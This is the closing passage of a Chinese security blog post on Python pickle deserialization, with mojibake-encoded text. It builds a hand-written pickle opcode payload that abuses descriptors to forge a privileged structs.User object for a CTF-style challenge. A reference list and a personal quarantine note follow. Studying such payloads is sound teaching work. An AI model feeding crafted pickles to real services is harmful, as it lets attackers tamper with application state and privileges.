<p>æ‰€ä»¥æˆ‘ä»¬åº”è¯¥è¿˜è¦åŠ ä¸€å¥ <code>User.privileged = User("tr0y", "root")</code> ä¿è¯ <code>user.__class__.__dict__</code> å·²ç»æœ‰äº† <code>privileged</code> å¹¶ä¸”æ˜¯ä¸€ä¸ªæ•°æ®æè¿°å™¨ï¼Œè¿™æ ·å°±ä¼šèµ°åˆ° <code>__set__</code>ã€‚æ©˜å‹ä»¬å¯èƒ½ä¼šé—®ï¼Œé‚£ä¸ºä»€ä¹ˆä¸èƒ½ <code>user.privileged = User("tr0y", "root")</code> è¿™ä¹ˆå†™å‘¢ï¼ŸåŸå› åœ¨äºï¼Œprivileged è¿™ä¸ªå±æ€§æ˜¯ä¸å­˜åœ¨äº <code>user</code> çš„ï¼Œæ‰€ä»¥ä¼šç»§ç»­åœ¨çˆ¶ç±»ä¸­æ‰¾ï¼Œè€Œçˆ¶ç±»ä¹Ÿæ²¡æœ‰è¿™ä¸ªå±æ€§ï¼Œæ‰€ä»¥ç›´æ¥æ‰§è¡Œçš„æ˜¯ <code>user.__dict__['privileged'] = User("tr0y", "root")</code>ï¼Œè¿™æ ·æ˜¯èµ·ä¸åˆ°ä½œç”¨çš„ã€‚åŒæ—¶ç”±äº flag å¹¶ä¸å­˜åœ¨äº <code>user.__class__.__dict__</code> é‡Œï¼Œä¸”çˆ¶ç±»çš„ User ä¹Ÿæ²¡æœ‰ flag è¿™ä¸ªå±æ€§ï¼Œæ‰€ä»¥ flag è¿™ä¸ªå±æ€§æ˜¯æ­£å¸¸èµ‹å€¼çš„ã€‚</p>
<p>è¿™æ ·çš„è¯ï¼Œæˆ‘ä»¬è¦åŠ çš„è¯­å¥åº”è¯¥æ˜¯ï¼š<br />
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">User.__set__ = User<br>User.privileged = User(<span class="hljs-string">&quot;tr0y&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>)<br></code></pre></td></tr></table></figure></p>
<p>æœ€åçš„æœ€åï¼Œç”±äº <code>structs.User.__dict__</code> æ˜¯ mappingproxy ç±»å‹ï¼Œæ‰€ä»¥éœ€è¦ç”¨åˆ°å˜é‡è¦†ç›–é‡Œæåˆ°çš„é‚£ä¸ª tip</p>
<p>ç»¼ä¸Šï¼Œè½¬ä¸º opcode å°±æ˜¯ï¼š<br />
<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript"># æ–°å¢ __set__<br>cstructs<span class="hljs-symbol">\n</span>User<span class="hljs-symbol">\n</span>(N&#125;V__set__<span class="hljs-symbol">\n</span>cstructs<span class="hljs-symbol">\n</span>User<span class="hljs-symbol">\n</span>stb<br>0  # å¼¹å‡º<br># æ–°å¢ privileged<br>cstructs<span class="hljs-symbol">\n</span>User<span class="hljs-symbol">\n</span>(N&#125;Vprivileged<span class="hljs-symbol">\n</span>cstructs<span class="hljs-symbol">\n</span>User<span class="hljs-symbol">\n</span>(Vtr0y<span class="hljs-symbol">\n</span>Vroot<span class="hljs-symbol">\n</span>tRstb<br>0  # å¼¹å‡º<br># è¿”å› structs.User å®ä¾‹<br>cstructs<span class="hljs-symbol">\n</span>User<span class="hljs-symbol">\n</span>(Vtr0y<span class="hljs-symbol">\n</span>Vroot<span class="hljs-symbol">\n</span>tR.<br><br># æœ€ç»ˆ payload<br>cstructs<span class="hljs-symbol">\n</span>User<span class="hljs-symbol">\n</span>(N&#125;V__set__<span class="hljs-symbol">\n</span>cstructs<span class="hljs-symbol">\n</span>User<span class="hljs-symbol">\n</span>stb0cstructs<span class="hljs-symbol">\n</span>User<span class="hljs-symbol">\n</span>(N&#125;Vprivileged<span class="hljs-symbol">\n</span>cstructs<span class="hljs-symbol">\n</span>User<span class="hljs-symbol">\n</span>(Vtr0y<span class="hljs-symbol">\n</span>Vroot<span class="hljs-symbol">\n</span>tRstb0cstructs<span class="hljs-symbol">\n</span>User<span class="hljs-symbol">\n</span>(Vtr0y<span class="hljs-symbol">\n</span>Vroot<span class="hljs-symbol">\n</span>tR.<br></code></pre></td></tr></table></figure></p>
<h2 id="æ€»ç»“">æ€»ç»“</h2>
<p>æ©˜å‹ä»¬åº”è¯¥å¯ä»¥å‘ç°ï¼Œopcode æœ‰ä¸ªç‰¹ç‚¹æ˜¯â€œèµ‹å€¼å®¹æ˜“æŸ¥å€¼éš¾â€ã€‚å¦‚ä½•åˆ©ç”¨ opcode æ„é€  payload éœ€è¦å¤šç»ƒä¹ æ‰èƒ½æŒæ¡ï¼Œä»¥åŠå¯¹ Python é­”æœ¯æ–¹æ³•ç­‰å„ç§ç¨åº•å±‚çš„åŸç†è¦æœ‰ä¸€å®šçš„ç†è§£ï¼Œæ‰èƒ½å¤ŸçŸ¥å…¶ç„¶ä¹ŸçŸ¥å…¶æ‰€ä»¥ç„¶ã€‚</p>
<p>Python ååºåˆ—åŒ–ã€Python æ²™ç®±é€ƒé€¸ï¼Œä»¥åŠ SSIT æ‰€éœ€çš„çŸ¥è¯†ç‚¹æœ‰ç€å¾ˆå¤§çš„å…³è”æ€§ï¼Œé€šå…¶ä¸€è€ŒçŸ¥å…¶ç™¾ï¼Œä¿æŒçŸ¥è¯†çš„è¿é€šæ€§æ•ˆç‡æ‰ä¼šé«˜ã€‚</p>
<h2 id="èµ„æ–™">èµ„æ–™</h2>
<ol type="1">
<li>Python æ²™ç®±é€ƒé€¸çš„ç»éªŒæ€»ç»“<br />
https://www.tr0y.wang/2019/05/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/</li>
<li>pickle.py ä¸­ opcode å¤‡æ³¨<br />
https://github.com/python/cpython/blob/9412f4d1ad28d48d8bb4725f05fd8f8d0daf8cd2/Lib/pickle.py#L107</li>
<li>å¯ä»¥åºåˆ—åŒ–çš„ä¸œè¥¿<br />
https://docs.python.org/zh-cn/3/library/pickle.html#what-can-be-pickled-and-unpickled</li>
<li>pkerï¼Œæ–¹ä¾¿ç”Ÿæˆ opcode çš„å·¥å…·<br />
https://github.com/EddieIvan01/pker</li>
<li>Python çš„å¯¼å…¥æœºåˆ¶<br />
https://docs.python.org/zh-cn/3/reference/import.html#the-import-system</li>
<li>pickle çš„ load_build é€»è¾‘<br />
https://github.com/python/cpython/blob/9412f4d1ad28d48d8bb4725f05fd8f8d0daf8cd2/Lib/pickle.py#L1697</li>
<li>BalsnCTF-2019 Python ååºåˆ—åŒ–é¢˜<br />
https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc</li>
<li>Python æè¿°å™¨<br />
https://docs.python.org/zh-cn/3/howto/descriptor.html</li>
</ol>
<br>
<p style="text-align: center;">
<font size="2px" color="gray">ä»Šå¹´åº”è¯¥æ˜¯æœ€æƒ¨çš„ä¸€ä¸ªæ˜¥èŠ‚<br>åœ¨å¤–åœ°å±…å®¶éš”ç¦»<br>ä½ è¯´å›å®¶å§å¥½åƒç¡®å®ä¹ŸæŒºæ— èŠçš„<br>ä½†å°±æ˜¯æ§åˆ¶ä¸ä½æƒ³å›å»<br>ä¸€ä¸ªäººè¿‡æ˜¥èŠ‚<br>å¤©å¤©åƒæ”¿åºœå‘çš„ç›’é¥­<br>çœŸæ˜¯å¤ªå®¹æ˜“ç„¦è™‘äº†<br>å¸Œæœ›ç–«æƒ…æ—©ç‚¹ç»“æŸ<br><br>è¿™ç¯‡æ–‡ç« æ˜¯ä»é™¤å¤•å¼€å§‹å†™çš„<br>åŒ–ç„¦è™‘ä¸ºåŠ¨åŠ›äº†å±å®æ˜¯<br><br>è¿™ä¸¤å¤©æäº†ä¸ªå¾®åšè´¦å·<br>å¾®åš id æ˜¯ 6575448477ï¼Œç”¨æˆ·åæ˜¯ Macr0phag3<br>ä¸»è¦æ˜¯æ•´æ´»å’Œå‘ä¸€äº›æŠ€æœ¯å•Šã€æ‘„å½±å•Šä¹‹ç±»çš„æ—¥å¸¸<br>éš”ç¦»æœŸé—´çœŸçš„è¯å¤šï¼Œæœ‰ç‚¹å•°å—¦å“ˆå“ˆå“ˆ<br>å¥½äº†å°±è¯´åˆ°è¿™å§<br><br>ç¥æ©˜å‹ä»¬è™å¹´è™è™ç”Ÿå¨ï¼Œå¤§å‰å¤§åˆ©</font><br />
<img src="https://clean-1252075454.cos.ap-nanjing.myqcloud.com/20200528120800990.png" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload style="zoom:30%" />
</p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/" class="category-chain-item">ç»éªŒæ€»ç»“</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/Web/">#Web</a>
      
        <a href="/tags/SecMap/">#SecMap</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>SecMap - ååºåˆ—åŒ–ï¼ˆPythonï¼‰</div>
      <div>https://www.tr0y.wang/2022/02/03/SecMap-unserialize-python/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>ä½œè€…</div>
          <div>Tr0y</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>å‘å¸ƒäº</div>
          <div>2022å¹´2æœˆ3æ—¥</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>æ›´æ–°äº</div>
          <div>2025å¹´4æœˆ15æ—¥</div>
        </div>
      
      <div class="license-meta-item">
        <div>è®¸å¯åè®®</div>
        <div>
          
            
            
              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
              <span class="hint--top hint--rounded" aria-label="BY - ç½²å">
                <i class="iconfont icon-by"></i>
              </span>
              </a>
            
          
        </div>
      </div>
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2022/04/13/SecMap-SSTI-jinja2/" title="SecMap - SSTIï¼ˆjinja2ï¼‰">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">SecMap - SSTIï¼ˆjinja2ï¼‰</span>
                        <span class="visible-mobile">ä¸Šä¸€ç¯‡</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2022/01/11/domain-takeover-by-cfp/" title="åˆ©ç”¨ Cloudflare Partner åŠ«æŒåŸŸå">
                        <span class="hidden-mobile">åˆ©ç”¨ Cloudflare Partner åŠ«æŒåŸŸå</span>
                        <span class="visible-mobile">ä¸‹ä¸€ç¯‡</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  <article id="comments" lazyload>
    
  <script type="text/javascript">
    Fluid.utils.loadComments('#comments', function() {
      var light = 'github-light';
      var dark = 'github-dark';
      var schema = document.documentElement.getAttribute('data-user-color-scheme');
      if (schema === 'dark') {
        schema = dark;
      } else {
        schema = light;
      }
      window.UtterancesThemeLight = light;
      window.UtterancesThemeDark = dark;
      var s = document.createElement('script');
      s.setAttribute('src', 'https://utteranc.es/client.js');
      s.setAttribute('repo', 'Macr0phag3/Macr0phag3.github.io');
      s.setAttribute('issue-term', 'title');
      
      s.setAttribute('label', 'comment');
      
      s.setAttribute('theme', schema);
      s.setAttribute('crossorigin', 'anonymous');
      document.getElementById('comments').appendChild(s);
    })
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


  </article>


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;ç›®å½•</p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  


  
  









    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">æœç´¢</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">å…³é”®è¯</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="leancloud-site-pv-container" style="display: none">
        æ€»è®¿é—®é‡ 
        <span id="leancloud-site-pv"></span>
         æ¬¡
      </span>
    
    
      <span id="leancloud-site-uv-container" style="display: none">
        æ€»è®¿å®¢æ•° 
        <span id="leancloud-site-uv"></span>
         äºº
      </span>
    
    

  
</div>

  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":true,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      collapseDepth   : CONFIG.toc.collapseDepth || 0,
      scrollSmooth    : true,
      headingsOffset  : -boardTop
    });
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  
      <script>
        if (!window.MathJax) {
          window.MathJax = {
            tex    : {
              inlineMath: { '[+]': [['$', '$']] }
            },
            loader : {
              load: ['ui/lazy']
            },
            options: {
              renderActions: {
                insertedScript: [200, () => {
                  document.querySelectorAll('mjx-container').forEach(node => {
                    let target = node.parentNode;
                    if (target.nodeName.toLowerCase() === 'li') {
                      target.parentNode.classList.add('has-jax');
                    }
                  });
                }, '', false]
              }
            }
          };
        } else {
          MathJax.startup.document.state(0);
          MathJax.texReset();
          MathJax.typeset();
          MathJax.typesetPromise();
        }
      </script>
    

  <script  src="https://lib.baomitu.com/mathjax/3.2.1/es5/tex-mml-chtml.js" ></script>

  <script defer src="/js/leancloud.js" ></script>

  <script  src="/js/local-search.js" ></script>





<!-- ä¸»é¢˜çš„å¯åŠ¨é¡¹ï¼Œå°†å®ƒä¿æŒåœ¨æœ€åº•éƒ¨ -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">åšå®¢åœ¨å…è®¸ JavaScript è¿è¡Œçš„ç¯å¢ƒä¸‹æµè§ˆæ•ˆæœæ›´ä½³</div>
  </noscript>
</body>
</html>
